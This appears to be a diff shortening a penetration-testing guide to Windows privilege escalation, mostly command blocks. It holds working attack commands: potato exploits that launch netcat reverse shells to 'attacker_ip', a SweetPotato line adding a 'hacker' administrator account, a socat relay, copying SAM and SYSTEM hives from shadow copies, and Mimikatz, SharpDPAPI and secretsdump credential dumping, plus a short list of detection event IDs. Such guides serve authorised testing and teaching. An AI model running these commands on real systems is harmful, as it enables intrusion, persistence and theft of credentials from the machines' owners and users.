@@ -27,47 +27,18 @@ Windows privilege escalation differs fundamentally from Linux. The attack surfac
 
 Run automated tools first to build a comprehensive picture of the attack surface. Review output methodically -- these tools surface findings you would otherwise miss.
 
-### WinPEAS
-
 ```powershell
-# Execute WinPEAS
-.\winPEASx64.exe
-
-# Redirect output for review
+# WinPEAS
 .\winPEASx64.exe > C:\Users\Public\winpeas.txt 2>&1
+.\winPEASx64.exe servicesinfo  # Specific checks only
 
-# Specific checks only
-.\winPEASx64.exe servicesinfo
-.\winPEASx64.exe userinfo
-.\winPEASx64.exe systeminfo
-```
-
-### PowerUp
-
-```powershell
-# Import and invoke all checks
+# PowerUp
 Import-Module .\PowerUp.ps1
 Invoke-AllChecks | Out-File -FilePath C:\Users\Public\powerup.txt
 
-# Targeted checks
-Get-ServiceUnquoted
-Get-ModifiableServiceFile
-Get-ModifiableService
-Get-RegistryAlwaysInstallElevated
-Get-UnattendedInstallFile
-```
-
-### SharpUp and Seatbelt
-
-```powershell
-# SharpUp -- compiled .NET version of PowerUp checks
+# SharpUp / Seatbelt / BeRoot
 .\SharpUp.exe audit
-
-# Seatbelt -- comprehensive host survey
 .\Seatbelt.exe -group=all > C:\Users\Public\seatbelt.txt
-.\Seatbelt.exe -group=misc -group=user -group=system
-
-# BeRoot -- another enumeration perspective
 .\beRoot.exe
 ```
 
@@ -115,29 +86,18 @@ whoami /priv
 ### GodPotato (Windows 8-11, Server 2012-2022)
 
 ```powershell
-# Works across a wide range of Windows versions
-.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+# Works across a wide range of Windows versions -- choose the right .NET binary
 .\GodPotato-NET4.exe -cmd "C:\Users\Public\nc.exe attacker_ip 4444 -e cmd.exe"
-
-# Choose the right .NET version
-.\GodPotato-NET2.exe -cmd "cmd /c whoami"  # Older systems
-.\GodPotato-NET35.exe -cmd "cmd /c whoami"
 ```
 
-### SweetPotato
+### SweetPotato and RoguePotato
 
 ```powershell
-# Combines multiple potato techniques
+# SweetPotato -- combines multiple potato techniques
 .\SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c net user hacker Password123! /add && net localgroup Administrators hacker /add"
-```
 
-### RoguePotato (Windows 10 1809+, Server 2019)
-
-```powershell
-# Requires a remote machine to receive the OXID resolution
-# On attacker machine, set up socat relay:
-# socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999
-
+# RoguePotato (Win10 1809+, Server 2019) -- requires attacker relay on port 135
+# Attacker: socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999
 .\RoguePotato.exe -r attacker_ip -e "C:\Users\Public\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999
 ```
 
@@ -499,41 +459,21 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM
 ```
 
-### DPAPI Credential Extraction
+### DPAPI and LSA Secrets
 
 ```powershell
-# List DPAPI master keys
-dir C:\Users\<username>\AppData\Roaming\Microsoft\Protect\
-dir C:\Users\<username>\AppData\Local\Microsoft\Protect\
+# DPAPI -- list credential blobs
+dir C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
+dir C:\Users\<user>\AppData\Local\Microsoft\Credentials\
 
-# List credential blobs
-dir C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\
-dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\
-
-# Using Mimikatz to decrypt (requires SYSTEM or user context)
+# Mimikatz DPAPI decryption (requires SYSTEM or user context)
 mimikatz.exe "privilege::debug" "dpapi::cred /in:C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\<blob>" exit
 
 # SharpDPAPI for targeted extraction
 .\SharpDPAPI.exe triage
-.\SharpDPAPI.exe credentials /target:C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
-```
 
-### LSA Secrets
-
-```powershell
-# Using Mimikatz
+# LSA secrets (service account passwords, auto-logon creds, machine account)
 mimikatz.exe "privilege::debug" "lsadump::secrets" exit
-
-# LSA secrets contain:
-# - Service account passwords (stored by SCM)
-# - Auto-logon credentials
-# - VPN/RAS connection passwords
-# - Machine account password
-
-# Using reg save + impacket
-reg save HKLM\SECURITY C:\Users\Public\SECURITY
-reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
-impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
 ```
 
 ### Credential Manager
@@ -542,30 +482,18 @@ impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
 # Enumerate stored credentials
 cmdkey /list
 
-# If credentials are stored for admin accounts
-# Use runas to execute commands
+# If credentials are stored for admin accounts, use runas
 runas /savecred /user:DOMAIN\admin "cmd.exe /c whoami > C:\Users\Public\whoami.txt"
-
-# PowerShell credential enumeration
-[System.Net.CredentialCache]::DefaultCredentials
-
-# Vault enumeration
-.\vaultcmd.exe /list
-.\vaultcmd.exe /listschema
-.\vaultcmd.exe /listcreds:"Windows Credentials" /all
 ```
 
 ### Additional Credential Sources
 
 ```powershell
 # Unattended install files
-dir C:\Unattend.xml C:\Windows\Panther\Unattend.xml /s 2>nul
-dir C:\Windows\Panther\Unattend\Unattend.xml /s 2>nul
-dir C:\sysprep\sysprep.xml C:\sysprep.inf /s 2>nul
+dir C:\Unattend.xml C:\Windows\Panther\Unattend.xml C:\sysprep\sysprep.xml /s 2>nul
 
-# IIS configuration
+# IIS configuration and web.config
 type C:\inetpub\wwwroot\web.config 2>nul
-type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul
 
 # WiFi passwords
 netsh wlan show profiles
@@ -598,28 +526,10 @@ Every technique above has corresponding detection opportunities. Understanding t
 
 Key log sources:
 
-```powershell
-# Defenders should monitor
-# Windows Security Log - Event IDs
-# 4688 - Process creation (enable command-line logging)
-# 4689 - Process termination
-# 4697 - Service installation
-# 4698 - Scheduled task creation
-# 4703 - Token privilege adjustment
-# 7045 - New service installed
-
-# Sysmon (if deployed)
-# Event 1  - Process creation with hashes
-# Event 7  - Image loaded (DLL monitoring)
-# Event 8  - CreateRemoteThread
-# Event 10 - Process access (LSASS access)
-# Event 11 - File creation
-# Event 13 - Registry value set
-
-# PowerShell logging
-# Script Block Logging (Event ID 4104)
-# Module Logging
-# Transcription
+```text
+Windows Security Log: 4688 (process creation), 4697 (service install), 4698 (task creation), 4703 (token adjust), 7045 (new service)
+Sysmon: Event 1 (process), 7 (DLL load), 8 (CreateRemoteThread), 10 (LSASS access), 13 (registry set)
+PowerShell: Script Block Logging (4104), Module Logging, Transcription
 ```
 
 ---
